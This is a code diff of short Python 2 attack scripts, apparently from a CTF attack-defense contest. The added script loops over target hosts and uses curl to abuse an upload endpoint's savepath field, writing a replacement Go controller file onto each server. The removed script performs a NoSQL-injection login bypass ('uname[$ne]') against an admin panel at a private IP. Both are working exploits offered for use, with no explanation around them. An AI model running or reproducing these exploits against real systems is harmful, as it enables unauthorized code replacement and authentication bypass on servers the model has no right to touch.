@@ -1,20 +1,15 @@
-#!/usr/bin/env python
+#!/usr/bin/python2
+
+import os
+
+hosts = open('data/ip.data').readlines()
+for host in hosts:
+    host = host.strip()
+    ip,port = host.split(':')
+    print ip
+    r = os.popen('curl %s:%s/api/upload/ -F "type=image" -F "savepath=/gotsctf2018/controllers" -F "image=@login_controller.go" --connect-timeout 2 '%(ip,port))
+    r = os.popen('curl %s:%s/logout'%(ip,port))
+    print r.read()
 
 
-from http import http
-from config import *
-from function import *
 
-def login(target):
-    res = http("get",target,target_port,"/ez_web/admin/index.php","",{})
-    pos_1 = res.find("PHPSESSID=")
-    pos_2 = res.find("path")
-    cookie = res[pos_1:pos_2]
-    print cookie
-    data = "uname[$ne]=666&passwd[$ne]=123456&target=login.cgi"
-    res = http("get",target,target_port,"/ez_web/cgi-bin/proxy.cgi?"+data,"",{"Cookie":cookie})
-    if "success" in res:
-	return cookie
-    return False
-
-login("192.168.2.32")
